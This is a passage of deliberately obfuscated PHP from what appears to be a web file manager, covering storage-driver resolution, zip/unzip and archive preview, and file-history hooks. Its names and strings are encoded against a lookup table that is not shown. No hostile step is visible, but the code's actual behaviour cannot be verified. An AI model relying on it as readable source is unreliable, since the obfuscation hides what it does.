$ËÏª¥Ä; } private static function driverMake(&$»ØÒß½í) { $úŸÖççÚ =& $_SERVER[ßğøİ]; $‡ª…íó‹ = KodIO::parse($»ØÒß½í); if (!self::$driverListSystem) { $‚Ú–¯¢ù = Model($úŸÖççÚ[764])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($‚Ú–¯¢ù, $úŸÖççÚ[399]); } if ($‡ª…íó‹[$úŸÖççÚ[33]] == KodIO::KOD_IO && !self::$driverListSystem[$‡ª…íó‹[$úŸÖççÚ[399]]]) { return !1; } $»ØÒß½í = $‡ª…íó‹[$úŸÖççÚ[1169]]; $Æ¾±¢Ê¸ = self::driverGet($‡ª…íó‹, $»ØÒß½í); return $Æ¾±¢Ê¸; } private static function driverGet($¶ıÎäÕ›, &$ºı¨â°) { $¤Î°öéú =& $_SERVER[ßğøİ]; $•ÉĞóõ§ = $¶ıÎäÕ›[$¤Î°öéú[1170]]; $š¹Üİ¹ö = $¶ıÎäÕ›[$¤Î°öéú[399]]; switch ($¶ıÎäÕ›[$¤Î°öéú[33]]) { case KodIO::KOD_IO: $¬ñÁ³Œï = self::$driverListSystem[$š¹Üİ¹ö]; break; case KodIO::KOD_SOURCE: $ºı¨â° = $š¹Üİ¹ö . $ºı¨â°; $¬ñÁ³Œï = array($¤Î°öéú[1171] => $¤Î°öéú[1172], $¤Î°öéú[6] => $¶ıÎäÕ›); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $²öÇ¨üõ = $GLOBALS[$¤Î°öéú[1173]]; self::$driverListUser = array_to_keyvalue($²öÇ¨üõ, $¤Î°öéú[399]); } $¬ñÁ³Œï = self::$driverListUser[$š¹Üİ¹ö]; break; case KodIO::KOD_SHARE_LINK: $¬ñÁ³Œï = array($¤Î°öéú[1171] => $¤Î°öéú[1174], $¤Î°öéú[6] => $¶ıÎäÕ›); $Š”åØÈ¾ = Action($¤Î°öéú[1175])->sharePathInfo($¶ıÎäÕ›[$¤Î°öéú[84]]); $ºı¨â° = $Š”åØÈ¾[$¤Î°öéú[402]]; if (!$Š”åØÈ¾[$¤Î°öéú[402]]) { $êÑ„È¢ì = Model($¤Î°öéú[601])->getInfo($Š”åØÈ¾[$¤Î°öéú[489]]); $ºı¨â° = KodIO::clear($êÑ„È¢ì[$¤Î°öéú[1176]] . $¶ıÎäÕ›[$¤Î°öéú[1169]]); $¶ıÎäÕ›[$¤Î°öéú[487]] = $êÑ„È¢ì; $¶ıÎäÕ›[$¤Î°öéú[1151]] = $ºı¨â°; $¬ñÁ³Œï = array($¤Î°öéú[1171] => $¤Î°öéú[1177], $¤Î°öéú[6] => $¶ıÎäÕ›); } break; case KodIO::KOD_SHARE_ITEM: $¬ñÁ³Œï = array($¤Î°öéú[1171] => $¤Î°öéú[1178], $¤Î°öéú[6] => $¶ıÎäÕ›); $êÑ„È¢ì = Model($¤Î°öéú[601])->getInfo($¶ıÎäÕ›[$¤Î°öéú[399]]); if ($êÑ„È¢ì[$¤Î°öéú[402]] == $¤Î°öéú[197]) { $ºı¨â° = KodIO::clear($êÑ„È¢ì[$¤Î°öéú[1176]] . $¶ıÎäÕ›[$¤Î°öéú[1169]]); $¶ıÎäÕ›[$¤Î°öéú[487]] = $êÑ„È¢ì; $¶ıÎäÕ›[$¤Î°öéú[1151]] = $ºı¨â°; $¬ñÁ³Œï = array($¤Î°öéú[1171] => $¤Î°öéú[1179], $¤Î°öéú[6] => $¶ıÎäÕ›); } else { if (!$ºı¨â°) { $ºı¨â° = $êÑ„È¢ì[$¤Î°öéú[402]]; } } break; default: $ºı¨â° = $¶ıÎäÕ›[$¤Î°öéú[84]]; $¬ñÁ³Œï = array($¤Î°öéú[1171] => $¤Î°öéú[1180]); break; } $¹ğöò÷­ = $¶ıÎäÕ›[$¤Î°öéú[84]]; if (!isset(self::$driverCache[$¹ğöò÷­])) { $§¢ä—öœ = strtolower($¬ñÁ³Œï[$¤Î°öéú[95]]); $ÉŸÒ¦Û = $GLOBALS[$¤Î°öéú[6]][$¤Î°öéú[89]][$¤Î°öéú[823]]; $ÒÓ±´ß = $¤Î°öéú[74] . (isset($ÉŸÒ¦Û[$§¢ä—öœ]) ? $ÉŸÒ¦Û[$§¢ä—öœ] : ucfirst($§¢ä—öœ)); if (!class_exists($ÒÓ±´ß)) { show_json("{$ÒÓ±´ß}\40\x6e\157\x74\x20\145\x78\x69\163\164\x73\x21", !1); } $À¿áÏ× = isset($¬ñÁ³Œï[$¤Î°öéú[6]]) ? $¬ñÁ³Œï[$¤Î°öéú[6]] : !1; self::$driverCache[$¹ğöò÷­] = new $ÒÓ±´ß($À¿áÏ×); } $ŒÌÆ¬Õò = self::$driverCache[$¹ğöò÷­]; $ŒÌÆ¬Õò->pathDriver = $•ÉĞóõ§; $ŒÌÆ¬Õò->pathBase = $¤Î°öéú[12]; if (isset($¬ñÁ³Œï[$¤Î°öéú[6]][$¤Î°öéú[1181]])) { $ŒÌÆ¬Õò->pathBase = rtrim($¬ñÁ³Œï[$¤Î°öéú[6]][$¤Î°öéú[1181]], $¤Î°öéú[8]) . $¤Î°öéú[8]; $ºı¨â° = $ŒÌÆ¬Õò->pathBase . ltrim($ºı¨â°, $¤Î°öéú[8]); } $ºı¨â° = $ŒÌÆ¬Õò->getPath($ºı¨â°); if (isset($¶ıÎäÕ›[$¤Î°öéú[1151]])) { $ºı¨â° = $¶ıÎäÕ›[$¤Î°öéú[1151]]; } $ŒÌÆ¬Õò->path = $ºı¨â°; return $ŒÌÆ¬Õò; } public static function errorTips($ˆ‰ÇÀõ¯ = false) { $í™ÉÚŞõ =& $_SERVER[ßğøİ]; static $œ ½ë¸ = array(); $úâ¯å’Ï = 1000; if ($ˆ‰ÇÀõ¯ === -1) { return $œ ½ë¸ ? $œ ½ë¸[count($œ ½ë¸) - 1] : $í™ÉÚŞõ[12]; } if ($ˆ‰ÇÀõ¯ === !1) { return implode($í™ÉÚŞõ[231], $œ ½ë¸); } if (count($œ ½ë¸) >= $úâ¯å’Ï) { $œ ½ë¸ = array_slice($œ ½ë¸, $úâ¯å’Ï * 0.5, $úâ¯å’Ï); } $œ ½ë¸[] = $ˆ‰ÇÀõ¯; write_log($í™ÉÚŞõ[162] . ACTION . $í™ÉÚŞõ[1182] . $ˆ‰ÇÀõ¯, $í™ÉÚŞõ[1183]); } public static function getLastError($‡Å‘ßşÑ = '') { $â÷½³ƒ¡ = self::errorTips(-1); return $â÷½³ƒ¡ ? $â÷½³ƒ¡ : $‡Å‘ßşÑ; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $Í·‚¦»ö; if (!$Í·‚¦»ö) { $“ã–É¤ = IO::init($_SERVER[ßğøİ][8]); } return $“ã–É¤; } private static function iconvSystem($Î¦äó¡É) { return self::local()->iconvSystem($Î¦äó¡É); } private static function iconvApp($şÄ¡”Öü) { return self::local()->iconvApp($şÄ¡”Öü); } public static function zip($°„ˆß€‡, $¿€Üïî¹ = "\172\151\160", $‘¤Éçú¦ = '', $•ÌÄØ÷š = REPEAT_RENAME) { $à¸Áİï‰ =& $_SERVER[ßğøİ]; $ÜÍŠÕì¤ = self::init($°„ˆß€‡[0][$à¸Áİï‰[84]]); $õØîî¼ = self::info($°„ˆß€‡[0][$à¸Áİï‰[84]]); $ËÛâ²âĞ = !1; if (!$‘¤Éçú¦ && $ÜÍŠÕì¤->getType() == $à¸Áİï‰[106]) { $ÉÆŠ½äª = self::zipFileList($°„ˆß€‡); } else { $ËÛâ²âĞ = $‘¤Éçú¦ ? $‘¤Éçú¦ : TEMP_FILES . $à¸Áİï‰[1184] . time() . rand_string(8) . $à¸Áİï‰[8]; mk_dir($ËÛâ²âĞ); $ÉÆŠ½äª = self::zipFileList($°„ˆß€‡, $ËÛâ²âĞ); } $¯ÜÍñåÏ = $õØîî¼[$à¸Áİï‰[32]]; if (count($ÉÆŠ½äª) > 1) { $ïñÍ·ù = IO::info(IO::pathFather($õØîî¼[$à¸Áİï‰[84]])); $¯ÜÍñåÏ = $ïñÍ·ù[$à¸Áİï‰[32]]; } $Ç«”ÜÕš = $ËÛâ²âĞ; if (!$Ç«”ÜÕš) { $Ç«”ÜÕš = get_path_father($õØîî¼[$à¸Áİï‰[84]]); if (!$‘¤Éçú¦ && $ÜÍŠÕì¤->getType() == $à¸Áİï‰[106]) { $Ç«”ÜÕš = get_path_father($ÜÍŠÕì¤->path); } $ÒğÆùÉ = IO::info($Ç«”ÜÕš); if (!$ÒğÆùÉ[$à¸Áİï‰[202]]) { show_json(LNG($à¸Áİï‰[1185]), !1); } } $€ÒÌâä = $Ç«”ÜÕš . $¯ÜÍñåÏ . $à¸Áİï‰[10] . $¿€Üïî¹; $€ÒÌâä = get_filename_auto($€ÒÌâä, $à¸Áİï‰[12], $•ÌÄØ÷š); $ú¨á¤ˆ» = self::iconvSystem($€ÒÌâä); foreach ($ÉÆŠ½äª as $òİæÖÓ => $À€üÑüí) { $ÉÆŠ½äª[$òİæÖÓ] = self::iconvSystem($À€üÑüí); } KodArchive::create($ú¨á¤ˆ», $ÉÆŠ½äª); if (!IO::exist($€ÒÌâä)) { if ($ËÛâ²âĞ) { del_dir($ËÛâ²âĞ); } show_json(LNG($à¸Áİï‰[1186]), !1); } if ($‘¤Éçú¦ || !$ËÛâ²âĞ) { if ($ËÛâ²âĞ && strstr($ËÛâ²âĞ, TEMP_FILES)) { $éŞ¶Õ… = $ÉÆŠ½äª = array(); recursion_dir($Ç«”ÜÕš, $éŞ¶Õ…, $ÉÆŠ½äª, 0); foreach ($éŞ¶Õ… as $ÍíÊß²ø) { del_dir($ÍíÊß²ø); } foreach ($ÉÆŠ½äª as $Û—Ÿ÷Ô‡) { if ($Û—Ÿ÷Ô‡ == $ú¨á¤ˆ») { continue; } del_file($Û—Ÿ÷Ô‡); } } return $€ÒÌâä; } $åìËÅû¨ = self::pathFather($õØîî¼[$à¸Áİï‰[84]]); $‘“¯´›† = self::move($€ÒÌâä, $åìËÅû¨, $•ÌÄØ÷š); if (!$‘“¯´›†) { del_dir($ËÛâ²âĞ); show_json(LNG($à¸Áİï‰[1186]), !1); } del_dir($ËÛâ²âĞ); return $‘“¯´›†; } public static function unzip($Ñ£Ïêøœ, $şˆ…²Ú› = "\162\145\160\x6c\x61\x63\x65") { $ »Ï•² =& $_SERVER[ßğøİ]; $³ê€¢äË = $Ñ£Ïêøœ[$ »Ï•²[84]]; $¿§İÏ‘ = $Ñ£Ïêøœ[$ »Ï•²[1187]]; if (!($ş¿’Î‚ = parent::info($³ê€¢äË))) { show_json(LNG($ »Ï•²[1188]), !1); } if (!($Ëˆùâ = parent::infoFull($¿§İÏ‘))) { $¿§İÏ‘ = parent::mkdir($¿§İÏ‘); $Ëˆùâ = array($ »Ï•²[84] => $¿§İÏ‘); } else { if (isset($Ëˆùâ[$ »Ï•²[402]]) && trim($Ëˆùâ[$ »Ï•²[84]], $ »Ï•²[8]) != trim($¿§İÏ‘, $ »Ï•²[8])) { $–àñ²ºå = KodIO::make($Ëˆùâ[$ »Ï•²[432]]); $¶¼¿ÀÀ— = parent::fileNameAuto($–àñ²ºå, $Ëˆùâ[$ »Ï•²[32]], REPEAT_RENAME_FOLDER, !0); $¿§İÏ‘ = parent::mkdir($–àñ²ºå . $¶¼¿ÀÀ—); $Ëˆùâ = array($ »Ï•²[84] => $¿§İÏ‘); } } $¿§İÏ‘ = $Ëˆùâ[$ »Ï•²[84]]; $–¿ãó˜î = self::tmpFileName($ş¿’Î‚); $²×¢ÄŞÂ = TEMP_FILES . $–¿ãó˜î; del_dir($²×¢ÄŞÂ); mk_dir($²×¢ÄŞÂ); $¶”—œïé = self::fileExt($ş¿’Î‚); $Â²ÍÁ­ = $²×¢ÄŞÂ . $ »Ï•²[10] . $¶”—œïé; if (!@file_exists(self::iconvSystem($Â²ÍÁ­))) { $å™ûé»­ = self::localFilePath($³ê€¢äË, $¶”—œïé); $Â²ÍÁ­ = $å™ûé»­ ? $å™ûé»­ : parent::download($³ê€¢äË, $Â²ÍÁ­); } $Â²ÍÁ­ = self::iconvSystem($Â²ÍÁ­); $˜è©ÃˆÌ = isset($Ñ£Ïêøœ[$ »Ï•²[1189]]) ? $Ñ£Ïêøœ[$ »Ï•²[1189]] : $ »Ï•²[1190]; $ĞŸÚÔ‘‘ = KodArchive::extract($Â²ÍÁ­, $²×¢ÄŞÂ . $ »Ï•²[8], $˜è©ÃˆÌ); self::archiveExt(); if (!$ĞŸÚÔ‘‘[$ »Ï•²[1191]]) { show_json($ »Ï•²[1192] . $ĞŸÚÔ‘‘[$ »Ï•²[1193]], !1); } Hook::trigger($ »Ï•²[1194], $²×¢ÄŞÂ); recursion_dir($²×¢ÄŞÂ, $ĞÀåÙÖş, $ØªÈ…şí, 0); $ˆ°„¡É× = array_merge($ĞÀåÙÖş, $ØªÈ…şí); foreach ($ˆ°„¡É× as $»Ä°ÈÖ) { $»Ä°ÈÖ = self::iconvApp($»Ä°ÈÖ); self::move($»Ä°ÈÖ, $¿§İÏ‘, $şˆ…²Ú›); } del_dir($²×¢ÄŞÂ); if (!$å™ûé»­) { del_file($Â²ÍÁ­); } return !0; } public static function unzipList($şıÌ¸§) { $²õ¨ÏÖá =& $_SERVER[ßğøİ]; $àæ×Ôçô = $şıÌ¸§[$²õ¨ÏÖá[84]]; $æ‚ÅÃú = isset($şıÌ¸§[$²õ¨ÏÖá[1195]]) ? $şıÌ¸§[$²õ¨ÏÖá[1195]] : -1; $®ŸçáĞ = 50000; if (request_url_safe($àæ×Ôçô)) { $ÂÊú¬ÆÊ = parse_url_query($àæ×Ôçô); if (!isset($ÂÊú¬ÆÊ[$²õ¨ÏÖá[84]])) { show_json($²õ¨ÏÖá[1196], !1); } } $êš·­Â® = isset($ÂÊú¬ÆÊ) ? $ÂÊú¬ÆÊ[$²õ¨ÏÖá[84]] : $àæ×Ôçô; $®ß‡‚ø¥ = self::info($êš·­Â®); $Àó€õÍ = self::fileExt($®ß‡‚ø¥); $„çôºê¹ = self::tmpFileName($®ß‡‚ø¥); if (isset($ÂÊú¬ÆÊ)) { $øÅô®˜” = array($ÂÊú¬ÆÊ[$²õ¨ÏÖá[84]], $ÂÊú¬ÆÊ[$²õ¨ÏÖá[1195]], $ÂÊú¬ÆÊ[$²õ¨ÏÖá[32]]); $Çø²Ê÷ = md5(implode($²õ¨ÏÖá[11], $øÅô®˜”)) . $²õ¨ÏÖá[10] . get_path_ext($ÂÊú¬ÆÊ[$²õ¨ÏÖá[32]]); } else { $øÅô®˜” = array($®ß‡‚ø¥[$²õ¨ÏÖá[32]], $®ß‡‚ø¥[$²õ¨ÏÖá[84]], $®ß‡‚ø¥[$²õ¨ÏÖá[76]]); $Çø²Ê÷ = md5(implode($²õ¨ÏÖá[11], $øÅô®˜”)) . $²õ¨ÏÖá[10] . $Àó€õÍ; } if ($æ‚ÅÃú == -1) { $†³Í ¤¨ = IO_PATH_SYSTEM_TEMP . "\172\x69\160\x56\151\145\x77\57{$„çôºê¹}\x2f{$Çø²Ê÷}\56\154\x6f\147"; $´¼•°° = self::infoFull($†³Í ¤¨); if ($´¼•°°) { $†³Í ¤¨ = $´¼•°°[$²õ¨ÏÖá[84]]; $ãƒàçÄ = self::getContent($†³Í ¤¨); if ($ãƒàçÄ) { $ÒêØ˜ ˜ = json_decode($ãƒàçÄ, !0); $ÒêØ˜ ˜ = is_array($ÒêØ˜ ˜) ? $ÒêØ˜ ˜ : array(); if (count($ÒêØ˜ ˜) >= $®ŸçáĞ) { show_json(sprintf(LNG($²õ¨ÏÖá[1197]), count($ÒêØ˜ ˜)), !1); } return $ÒêØ˜ ˜; } } else { $†³Í ¤¨ = self::mkfile($†³Í ¤¨); } } $éíÅ­•½ = TEMP_FILES . $„çôºê¹; if (!is_dir($éíÅ­•½)) { mk_dir($éíÅ­•½); } $çšäí¾ = $éíÅ­•½ . $²õ¨ÏÖá[8] . $Çø²Ê÷; if (!@file_exists(self::iconvSystem($çšäí¾))) { if (isset($ÂÊú¬ÆÊ)) { url_request($àæ×Ôçô, $²õ¨ÏÖá[1198], $çšäí¾); } else { $§ÌÃˆÍ… = self::localFilePath($àæ×Ôçô, $Àó€õÍ); $çšäí¾ = $§ÌÃˆÍ… ? $§ÌÃˆÍ… : self::download($àæ×Ôçô, $çšäí¾); } } $çšäí¾ = self::iconvSystem($çšäí¾); if ($æ‚ÅÃú >= 0) { $šÏİÙ‡ª = isset($şıÌ¸§[$²õ¨ÏÖá[1199]]) ? $şıÌ¸§[$²õ¨ÏÖá[1199]] : !1; $œÎ¾½Âä = isset($şıÌ¸§[$²õ¨ÏÖá[32]]) ? $şıÌ¸§[$²õ¨ÏÖá[32]] : $²õ¨ÏÖá[12]; KodArchive::filePreview($çšäí¾, $æ‚ÅÃú, $šÏİÙ‡ª, $œÎ¾½Âä); self::archiveExt(); die; } $†‹ğğĞ’ = KodArchive::listContent($çšäí¾); self::archiveExt(); del_dir($éíÅ­•½); if (!$†‹ğğĞ’[$²õ¨ÏÖá[1191]]) { show_json($†‹ğğĞ’[$²õ¨ÏÖá[1193]], !1); } $ÒêØ˜ ˜ = json_encode($†‹ğğĞ’[$²õ¨ÏÖá[1193]]); self::setContent($†³Í ¤¨, $ÒêØ˜ ˜); if (count($†‹ğğĞ’[$²õ¨ÏÖá[1193]]) >= $®ŸçáĞ) { show_json(sprintf(LNG($²õ¨ÏÖá[1197]), count($†‹ğğĞ’[$²õ¨ÏÖá[1193]])), !1); } return $†‹ğğĞ’[$²õ¨ÏÖá[1193]]; } private static function fileExt($·ÜöÀô) { $àØÚùÄ =& $_SERVER[ßğøİ]; $òèŸ‘ĞÑ = $·ÜöÀô[$àØÚùÄ[174]]; if ($òèŸ‘ĞÑ == $àØÚùÄ[1200]) { $“óµŒÓ« = $àØÚùÄ[1201]; if (substr($·ÜöÀô[$àØÚùÄ[32]], -strlen($“óµŒÓ«)) == $“óµŒÓ«) { $òèŸ‘ĞÑ = $àØÚùÄ[1202]; } } self::archiveExt($òèŸ‘ĞÑ); return $òèŸ‘ĞÑ; } private static function zipFileList($‚¾…Ø¢ğ, $ï¼¤™”Í = false) { $šî²í–¥ =& $_SERVER[ßğøİ]; $ôö–ŞÆ¬ = array(); foreach ($‚¾…Ø¢ğ as $Ò’üåœµ) { $ıü‘ÊÈá = $Ò’üåœµ[$šî²í–¥[84]]; if ($ï¼¤™”Í) { $ıü‘ÊÈá = self::copy($Ò’üåœµ[$šî²í–¥[84]], $ï¼¤™”Í, $šî²í–¥[815]); } else { $„›Ç¹èø = self::init($Ò’üåœµ[$šî²í–¥[84]]); if ($„›Ç¹èø->getType() == $šî²í–¥[106]) { $ıü‘ÊÈá = $„›Ç¹èø->path; } } if ($ıü‘ÊÈá && self::local()->exist($ıü‘ÊÈá)) { $ôö–ŞÆ¬[$Ò’üåœµ[$šî²í–¥[84]]] = $ıü‘ÊÈá; } } if (!empty($ôö–ŞÆ¬)) { return array_values($ôö–ŞÆ¬); } show_json(LNG($šî²í–¥[1166]), !1); } public static function tmpFileName($øæĞ¬”ß) { $ıúŞäÕÄ =& $_SERVER[ßğøİ]; $Õƒù¥ñÈ = array($øæĞ¬”ß[$ıúŞäÕÄ[32]], $øæĞ¬”ß[$ıúŞäÕÄ[84]], $øæĞ¬”ß[$ıúŞäÕÄ[76]], $øæĞ¬”ß[$ıúŞäÕÄ[521]]); return md5(implode($ıúŞäÕÄ[11], $Õƒù¥ñÈ)); } private static function localFilePath($øÚ­’ÄÖ, $±Í©é¼ñ) { $ë¥³Îü¤ =& $_SERVER[ßğøİ]; if ($±Í©é¼ñ == $ë¥³Îü¤[1203] && strtoupper(substr(PHP_OS, 0, 3)) == $ë¥³Îü¤[1204]) { return !1; } $øø˜éšä = KodIO::parse($øÚ­’ÄÖ); if ($øø˜éšä[$ë¥³Îü¤[33]] == KodIO::KOD_SOURCE) { $Ò¡Õ»Ú’ = Model($ë¥³Îü¤[822])->fileInfoGet(KodIO::sourceID($øÚ­’ÄÖ)); if (!$Ò¡Õ»Ú’[$ë¥³Îü¤[84]]) { show_json($ë¥³Îü¤[1205], !1); } $øÚ­’ÄÖ = $Ò¡Õ»Ú’[$ë¥³Îü¤[84]]; } $éÛõùá™ = self::init($øÚ­’ÄÖ); if ($éÛõùá™->pathParse[$ë¥³Îü¤[1151]]) { $øÚ­’ÄÖ = $éÛõùá™->pathParse[$ë¥³Îü¤[1151]]; $éÛõùá™ = self::init($øÚ­’ÄÖ); } $ÃÈ¶Éœ¦ = $éÛõùá™->getType(); if ($ÃÈ¶Éœ¦ == $ë¥³Îü¤[106] || $ÃÈ¶Éœ¦ == $ë¥³Îü¤[1206]) { if (!$éÛõùá™->exist($éÛõùá™->path)) { show_json(LNG($ë¥³Îü¤[105]), !1); } return $éÛõùá™->path; } return !1; } private static function archiveExt($Œ–ı¢µÄ = '') { $GLOBALS[$_SERVER[ßğøİ][1207]] = $Œ–ı¢µÄ; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $²ı©Ç‡š =& $_SERVER[ßğøİ]; $Å‡›Ùî¹ = $GLOBALS[$²ı©Ç‡š[6]][$²ı©Ç‡š[89]]; if ($Å‡›Ùî¹[$²ı©Ç‡š[1208]] != 1) { return; } if ($Å‡›Ùî¹[$²ı©Ç‡š[1209]] <= 0) { return; } if (isset($_REQUEST[$²ı©Ç‡š[1210]]) && $_REQUEST[$²ı©Ç‡š[1210]] == $²ı©Ç‡š[88]) { return; } Hook::bind($²ı©Ç‡š[1211], $²ı©Ç‡š[1212]); Hook::bind($²ı©Ç‡š[1213], $²ı©Ç‡š[1214]); Hook::bind($²ı©Ç‡š[1215], $²ı©Ç‡š[1216]); Hook::bind($²ı©Ç‡š[1217], $²ı©Ç‡š[1218]); Hook::bind($²ı©Ç‡š[1219], $²ı©Ç‡š[1220]); Hook::bind($²ı©Ç‡š[1221], $²ı©Ç‡š[1222]); } public static function eventBeforeUpload($ÍàÃ¯ù) { if ($ÍàÃ¯ù[3] && $ÍàÃ¯ù[3] != REPEAT_REPLACE) { return; } $àÃ¶³å‚ = self::parsePath($ÍàÃ¯ù[0]); if (!$àÃ¶³å‚) { return; } self::add($àÃ¶³å‚); } public static function eventBeforeEdit($ù¦Õº›¥) { $Š­ï÷³½ = self::parsePath($ù¦Õº›¥[0]); if (!$Š­ï÷³½) { return; } self::add($Š­ï÷³½); } public static function eventBeforeCopyFile($ĞÃâçƒø, $ØÒ³»Ú©, $Æ»•½éƒ, $³ÕèĞ‹÷, $ØÔŸÜ¨, $Ãà¢ÏçÑ) { $ “Ê˜ËŸ =& $_SERVER[ßğøİ]; if (isset($Æ»•½éƒ->_data[$ “Ê˜ËŸ[1155]]) && $Æ»•½éƒ->_data[$ “Ê˜ËŸ[1155]]) { return; } $¢ëğ’ô = $Æ»•½éƒ->getPathOuter($³ÕèĞ‹÷); $¯òĞå = self::parsePath($¢ëğ’ô); if (!$¯òĞå) { return; } self::add($¯òĞå); } public static function eventBeforeRename($³”¿èëÌ) { $Êşì¥İ¿ =& $_SERVER[ßğøİ]; $Ûãâ´ï« = self::parsePath($³”¿èëÌ[0]); if (!$Ûãâ´ï«) { return; } $Çœ¨‰ĞÎ = self::checkInHistory($Ûãâ´ï«); if (!$Çœ¨‰ĞÎ) { return; } if ($Çœ¨‰ĞÎ[$Êşì¥İ¿[33]] == $Êşì¥İ¿[199]) { $ñÕâşÙğ = self::listData($Ûãâ´ï«); if ($ñÕâşÙğ && $ñÕâşÙğ[$Êşì¥İ¿[369]]) { self::moveHistory($Ûãâ´ï«, $³”¿èëÌ[1]); } } else { IO::rename($Çœ¨‰ĞÎ[$Êşì¥İ¿[84]], $³”¿èëÌ[1]); } } public static function eventBeforeMove($òÚƒó­) { $ ÜœÆòÑ =& $_SERVER[ßğøİ]; $µ¶³†Åî = self::parsePath($òÚƒó­[0]); if (!$µ¶³†Åî) { return; } $ûç°£Í = self::parsePath($òÚƒó­[1]); if (!$ûç°£Í) { return; } $’Ûß³¼¿ = $òÚƒó­[3]; $€ê Ó‚À = self::checkInHistory($µ¶³†Åî); if (!$€ê Ó‚À) { return; } $¾ÍØïğ = self::pathHistory($ûç°£Í); if ($€ê Ó‚À[$ ÜœÆòÑ[33]] == $ ÜœÆòÑ[199]) { $½Ş§ó”¾ = self::listData($µ¶³†Åî); $ç†•îû¦ = rtrim($ûç°£Í, $ ÜœÆòÑ[8]) . $ ÜœÆòÑ[8] . ($’Ûß³¼¿ ? $’Ûß³¼¿ : get_path_this($µ¶³†Åî)); $È„ğâÉ¢ = self::listData($ç†•îû¦); if ($½Ş§ó”¾ && $½Ş§ó”¾[$ ÜœÆòÑ[369]] && $È„ğâÉ¢ && $È„ğâÉ¢[$ ÜœÆòÑ[369]]) { return self::clear($µ¶³†Åî); } if ($½Ş§ó”¾ && $½Ş§ó”¾[$ ÜœÆòÑ[369]]) { self::moveHistory($µ¶³†Åî, $’Ûß³¼¿, $¾ÍØïğ); } } else { IO::move($€ê Ó‚À[$ ÜœÆòÑ[84]], $¾ÍØïğ, !1, $’Ûß³¼¿); self::clearEmptyFolder(IO::pathFather($€ê Ó‚À[$ ÜœÆòÑ[84]])); } } public static function eventAfterRemove($ƒ¨ã¾¼Û, $êù§ô£Í) { $Õê÷ÀüŠ =& $_SERVER[ßğøİ]; if (!$êù§ô£Í) { return; } $ºàù¬‰Á = self::parsePath($ƒ¨ã¾¼Û[0]); if (!$ºàù¬‰Á) { return; } $Ãïíº§… = self::checkInHistory($ºàù¬‰Á); if (!$Ãïíº§…) { return; } if ($Ãïíº§…[$Õê÷ÀüŠ[33]] == $Õê÷ÀüŠ[199]) { $ì¼€Æ = self::listData($ºàù¬‰Á, !1); if ($ì¼€Æ && $ì¼€Æ[$Õê÷ÀüŠ[369]]) { self::clear($ºàù¬‰Á, !1); } } else { IO::remove($Ãïíº§…[$Õê÷ÀüŠ[84]]); self::clearEmptyFolder(IO::pathFather($Ãïíº§…[$Õê÷ÀüŠ[84]])); } } private static function checkInHistory($ÆìÏ²ğ) { $ÅãÉöÀÑ = self::pathHistory($ÆìÏ²ğ); if (!IO::exist($ÅãÉöÀÑ)) { $ÅãÉöÀÑ .= $_SERVER[ßğøİ][1223]; } return IO::exist($ÅãÉöÀÑ) ? IO::info($ÅãÉöÀÑ) : !1; } private static function parsePath($©ôÍ¯†‚) { $õå¼öÌÈ =& $_SERVER[ßğøİ]; if (!$©ôÍ¯†‚) { return !1; } if ($GLOBALS[$õå¼öÌÈ[1224]]) { return; } $õ®şù¸” = KodIO::parse($©ôÍ¯†‚); $˜ŒŸŒçÄ = $õ®şù¸”[$õå¼öÌÈ[33]]; $Æ†˜“÷Æ = !$˜ŒŸŒçÄ || $˜ŒŸŒçÄ == KodIO::KOD_IO || $˜ŒŸŒçÄ == KodIO::KOD_SHARE_ITEM; if (!$Æ†˜“÷Æ || !$õ®şù¸”[$õå¼öÌÈ[1225]]) { return !1; } if (substr($©ôÍ¯†‚, 0, strlen(DATA_PATH . $õå¼öÌÈ[1226])) == DATA_PATH . $õå¼öÌÈ[1226]) { return !1; } if ($˜ŒŸŒçÄ == KodIO::KOD_SHARE_ITEM) { $Ğš¦å‚Ğ = IO::init($©ôÍ¯†‚); if ($Ğš¦å‚Ğ->pathParse[$õå¼öÌÈ[1151]]) { return self::parsePath($Ğš¦å‚Ğ->pathParse[$õå¼öÌÈ[1151]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $³«¹³¯÷ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $õå¼öÌÈ[1227]); foreach ($³«¹³¯÷ as $Ü‰ĞÂƒ¥) { if (!$˜ŒŸŒçÄ && substr($©ôÍ¯†‚, 0, strlen($Ü‰ĞÂƒ¥)) == $Ü‰ĞÂƒ¥) { return !1; } } self::log($GLOBALS[$õå¼öÌÈ[1146]] . $õå¼öÌÈ[1228] . $©ôÍ¯†‚); return $©ôÍ¯†‚; } private static function pathHistory($îáê˜ÀÔ) { $¨»â§µà =& $_SERVER[ßğøİ]; $ŒÍÑ­•ü = self::$_historyBase . ltrim(KodIO::clear($îáê˜ÀÔ), $¨»â§µà[8]); $ŒÍÑ­•ü = str_replace(array($¨»â§µà[1229]), array($¨»â§µà[1230]), $ŒÍÑ­•ü); return $ŒÍÑ­•ü; } public static function log($Ãğş¹„º) { } public static function historyCount($ú’íÜĞœ) { $™ìî…ˆƒ =& $_SERVER[ßğøİ]; $ãÀ‹Å„ = array(); $ ˆ­‚­– = array(); foreach ($ú’íÜĞœ as $©Äğ®œ) { $‹·©â¼Å = get_path_father($©Äğ®œ); if (!$ ˆ­‚­–[$‹·©â¼Å]) { $ ˆ­‚­–[$‹·©â¼Å] = array(); } $ ˆ­‚­–[$‹·©â¼Å][] = get_path_this($©Äğ®œ); } foreach ($ ˆ­‚­– as $‹·©â¼Å => $é‹ÔÙå¡) { $Ÿº´“§ı = self::parsePath($‹·©â¼Å); if (!$Ÿº´“§ı) { continue; } foreach ($é‹ÔÙå¡ as $©ı­™®š) { $°îßÅ™µ = self::listData(rtrim($Ÿº´“§ı, $™ìî…ˆƒ[8]) . $™ìî…ˆƒ[8] . $©ı­™®š, !1); if ($°îßÅ™µ && $°îßÅ™µ[$™ìî…ˆƒ[369]]) { $ãÀ‹Å„[rtrim($‹·©â¼Å, $™ìî…ˆƒ[8]) . $™ìî…ˆƒ[8] . $©ı­™®š] = count($°îßÅ™µ[$™ìî…ˆƒ[369]]); } } } return $ãÀ‹Å„; } public static function add($ôÃ•°”·) { $ÚŸ’âÀ¡ =& $_SERVER[ßğøİ]; $ù´·˜©â = self::listData($ôÃ•°”·); if (!$ù´·˜©â) { return; } $˜®Ú¬¯¤ = 